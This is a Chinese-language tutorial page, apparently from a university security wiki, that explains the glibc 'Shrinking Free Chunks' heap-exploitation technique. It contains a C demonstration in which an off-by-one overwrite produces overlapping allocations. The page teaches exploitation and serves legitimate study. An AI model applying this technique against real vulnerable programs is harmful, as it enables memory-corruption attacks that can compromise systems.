@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>heap利用 5/9: Shrinking Free Chunks - 安全维基</title><meta name="Description" content="分享安全技术"><meta property="og:title" content="heap利用 5/9: Shrinking Free Chunks" />
+<meta property="og:description" content="“Glibc Adventures: The Forgotten Chunk”中描述了Shrinking Free Chunks攻击，其因利用了单字节堆溢出（通常由于 &lsquo;off by one&rsquo; 而被发现。这种攻击的目标是" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-05T15:36:08+08:00" />
+<meta property="article:modified_time" content="2023-02-05T15:36:08+08:00" /><meta property="og:site_name" content="湖南大学安全Wiki" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="heap利用 5/9: Shrinking Free Chunks"/>
+<meta name="twitter:description" content="“Glibc Adventures: The Forgotten Chunk”中描述了Shrinking Free Chunks攻击，其因利用了单字节堆溢出（通常由于 &lsquo;off by one&rsquo; 而被发现。这种攻击的目标是"/>
+<meta name="application-name" content="湖南大学安全Wiki">
+<meta name="apple-mobile-web-app-title" content="湖南大学安全Wiki"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="../../../favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="../../../favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="../../../favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="../../../apple-touch-icon.png"><link rel="mask-icon" href="../../../safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="../../../site.webmanifest"><link rel="canonical" href="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks/" /><link rel="prev" href="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A86-house-of-spirit/" /><link rel="next" href="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A84-unlink-exploit/" /><link rel="stylesheet" href="../../../css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "heap利用 5/9: Shrinking Free Chunks",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/1-heap%E5%88%A9%E7%94%A8\/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks\/"
+        },"genre": "posts","keywords": "heap利用","wordcount":  841 ,
+        "url": "\/posts\/1-heap%E5%88%A9%E7%94%A8\/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks\/","datePublished": "2023-02-05T15:36:08+08:00","dateModified": "2023-02-05T15:36:08+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "admin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="../../../" title="安全维基">湖南大学安全Wiki</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="../../../categories/"> 所有分类 </a><a class="menu-item" href="../../../posts/"> 文章 </a><a class="menu-item" href="../../../tags/"> 标签 </a><a class="menu-item" href="../../../about/"> 关于 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="../../../" title="安全维基">湖南大学安全Wiki</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="../../../categories/" title="">所有分类</a><a class="menu-item" href="../../../posts/" title="">文章</a><a class="menu-item" href="../../../tags/" title="">标签</a><a class="menu-item" href="../../../about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">heap利用 5/9: Shrinking Free Chunks</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="../../../" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>admin</a></span>&nbsp;<span class="post-category">收录于 <a href="../../../categories/heap%E5%88%A9%E7%94%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>heap利用</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-02-05">2023-02-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 841 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><!-- raw HTML omitted -->
+<p>“<a href="https://www.accenture.com/jp-ja" target="_blank" rel="noopener noreffer ">Glibc Adventures: The Forgotten Chunk</a>”中描述了Shrinking Free Chunks攻击，其因利用了单字节堆溢出（通常由于 &lsquo;<a href="https://en.wikipedia.org/wiki/Off-by-one_error" target="_blank" rel="noopener noreffer ">off by one</a>&rsquo; 而被发现。这种攻击的目标是让 &lsquo;malloc&rsquo; 返回一个chunk，这个chunk与目前正在使用的已分配的chunk重叠。首先分配3个chunk（<code>a</code>，<code>b</code>，<code>c</code>），这三个chunk在内存空间中是连续的，然后释放中间块<code>b</code>。此时如果第一个chunk溢出，会覆盖中间块的空间，攻击者将最低有效字节设为 0，这会“缩小”chunk的大小。接下来，从中间空闲块中分配两个小chunk（<code>b1</code> 和 <code>b2</code>），此时第三个chunk的 <code>prev_size</code>不会更新，因为 <code>b</code>+ <code>b-&gt;size</code> 不再指向 <code>c</code>，而是指向 <code>c</code> 之前的内存区域。然后，<code>b1</code> 和 <code>c</code> 一起被释放，<code>c</code> 仍然假定 <code>b</code> 是空闲的并与 <code>b</code> 合并（因为 <code>prev_size</code> 没有得到更新，因此 <code>c</code> - <code>c-&gt;prev_size</code> 仍然指向 <code>b</code>）。这导致一个大的空闲块从 <code>b</code> 开始并与 <code>b2</code> 重叠。此时让一个新的 malloc 返回这个大chunk，从而完成攻击。下图[<a href="https://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf" target="_blank" rel="noopener noreffer ">Image Source</a>]总结了这些步骤：</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>下列代码展示了一个这种攻击的案例。(完整代码见<a href="https://github.com/DhavalKapil/heap-exploitation/blob/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/shrinking_free_chunks.c" target="_blank" rel="noopener noreffer ">此处</a>)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="p">{</span>
+  <span class="n">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
+  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">19</span><span class="p">];</span>               <span class="c1">// padding
+</span><span class="c1"></span><span class="p">};</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">,</span> <span class="o">*</span><span class="n">b1</span><span class="p">,</span> <span class="o">*</span><span class="n">b2</span><span class="p">,</span> <span class="o">*</span><span class="n">big</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">b_chunk</span><span class="p">,</span> <span class="o">*</span><span class="n">c_chunk</span><span class="p">;</span>
+
+<span class="c1">// Grab three consecutive chunks in memory
+</span><span class="c1"></span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>                            <span class="c1">// at 0xfee010
+</span><span class="c1"></span><span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>                            <span class="c1">// at 0xfee120
+</span><span class="c1"></span><span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>                            <span class="c1">// at 0xfee330
+</span><span class="c1"></span>
+<span class="n">b_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">b</span> <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="n">size_t</span><span class="p">));</span>
+<span class="n">c_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">c</span> <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="n">size_t</span><span class="p">));</span>
+
+<span class="c1">// free b, now there is a large gap between &#39;a&#39; and &#39;c&#39; in memory
+</span><span class="c1">// b will end up in unsorted bin
+</span><span class="c1"></span><span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+
+<span class="c1">// Attacker overflows &#39;a&#39; and overwrites least significant byte of b&#39;s size
+</span><span class="c1">// with 0x00. This will decrease b&#39;s size.
+</span><span class="c1"></span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">b_chunk</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+
+<span class="c1">// Allocate another chunk
+</span><span class="c1">// &#39;b&#39; will be used to service this chunk.
+</span><span class="c1">// c&#39;s previous size will not updated. In fact, the update will be done a few
+</span><span class="c1">// bytes before c&#39;s previous size as b&#39;s size has decreased.
+</span><span class="c1">// So, b + b-&gt;size is behind c.
+</span><span class="c1">// c will assume that the previous chunk (c - c-&gt;prev_size = b/b1) is free
+</span><span class="c1"></span><span class="n">b1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>                           <span class="c1">// at 0xfee120
+</span><span class="c1"></span>
+<span class="c1">// Allocate another chunk
+</span><span class="c1">// This will come directly after b1
+</span><span class="c1"></span><span class="n">b2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>                           <span class="c1">// at 0xfee1b0
+</span><span class="c1"></span><span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span> <span class="s">&#34;victim&#39;s data&#34;</span><span class="p">);</span>
+
+<span class="c1">// Free b1
+</span><span class="c1"></span><span class="n">free</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>
+
+<span class="c1">// Free c
+</span><span class="c1">// This will now consolidate with b/b1 thereby merging b2 within it
+</span><span class="c1">// This is because c&#39;s prev_in_use bit is still 0 and its previous size
+</span><span class="c1">// points to b/b1
+</span><span class="c1"></span><span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+
+<span class="c1">// Allocate a big chunk to cover b2&#39;s memory as well
+</span><span class="c1"></span><span class="n">big</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>                          <span class="c1">// at 0xfee120
+</span><span class="c1"></span><span class="n">memset</span><span class="p">(</span><span class="n">big</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x200</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">b2</span><span class="p">);</span>       <span class="c1">// Prints AAAAAAAAAAA... !
+</span></code></pre></div><p><code>big</code> 现在指向初始 <code>b</code> 块并与 <code>b2</code> 重叠，此时即使<code>big</code>和<code>b2</code>的空间没有被释放，这两个块的内容也会被更新。需要注意的是，攻击者不仅可以缩小<code>b</code>，还可以增加 <code>b</code> 的大小，两者都能导致类似的重叠情况。当 &lsquo;malloc&rsquo; 请求另一个增加大小的块时，<code>b</code> 将用于处理此请求，此时 <code>c</code> 的内存也将成为返回的这个新块的一部分。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-02-05</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks/" data-title="heap利用 5/9: Shrinking Free Chunks" data-hashtags="heap利用"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks/" data-hashtag="heap利用"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks/" data-title="heap利用 5/9: Shrinking Free Chunks"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks/" data-title="heap利用 5/9: Shrinking Free Chunks"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A85-shrinking-free-chunks/" data-title="heap利用 5/9: Shrinking Free Chunks"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="../../../tags/heap%E5%88%A9%E7%94%A8/">heap利用</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="../../../">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A86-house-of-spirit/" class="prev" rel="prev" title="heap利用 6/9: House of Spirit"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>heap利用 6/9: House of Spirit</a>
+            <a href="../../../posts/1-heap%E5%88%A9%E7%94%A8/heap%E5%88%A9%E7%94%A84-unlink-exploit/" class="next" rel="next" title="heap利用 4/9: Unlink Exploit">heap利用 4/9: Unlink Exploit<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="../../../" target="_blank">admin</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"lightgallery":true};</script><script type="text/javascript" src="../../../js/theme.min.js"></script></body>
+</html>
